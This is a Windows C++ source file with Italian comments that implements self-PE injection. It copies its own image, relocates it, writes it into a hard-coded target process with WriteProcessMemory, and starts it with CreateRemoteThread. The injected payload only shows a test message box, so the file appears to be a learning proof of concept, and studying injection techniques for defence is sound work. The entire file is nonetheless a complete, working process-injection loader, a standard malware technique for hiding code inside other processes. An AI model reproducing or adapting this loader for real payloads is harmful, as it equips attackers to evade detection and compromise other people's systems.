#include <iostream>
#include <stdio.h>
#include <windows.h>

#define PROCESS_PID 2308

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset: 12;
    USHORT Type: 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint(){
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Test Process Injection!", NULL);
    return 0x0;
}

int main(){

    // Prende il base address dell'immagine corrente
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR) imageBase + dosHeader->e_lfanew);

    // Alloca un nuovo blocco di memoria e copia l'immagine Portable Executabe (PE) corrente in questo nuovo blocco di memoria
    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    // Apre il processo bersaglio - Questo e`il processo in cui injetteremo dentro questo PE
    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PROCESS_PID);

    // Alloca un nuovo blocco di memoria nel processo bersaglio. Questo e`dove injetteremo questo PE
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Calcola delta tra gli indirizzi di dove si trovera`l'immagine nel processo bersaglio e dove si trova attualmente
    DWORD_PTR deltaImageBase = (DWORD_PTR) targetImage - (DWORD_PTR) imageBase;

    // Rialloca localImage per assicurarsi che avra`un indirizzo corretto una volta che e`nel processo bersaglio
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocationEntriesCount = 0x0;
    PDWORD_PTR patchedAddress;
    PBASE_RELOCATION_ENTRY relocationRVA = NULL;

    while(relocationTable->SizeOfBlock > 0x0){
        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 0x1);

        for(short i = 0x0; i < relocationEntriesCount; i++){
            if(relocationRVA[i].Offset){
                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

    // Scrive la localImage riallocata dentro il processo bersaglio
    WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

    // Avvia il PE iniettato dentro il processo bersaglio
    CreateRemoteThread(targetProcess, NULL, 0x0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0x0, NULL);

    return 0x0;
}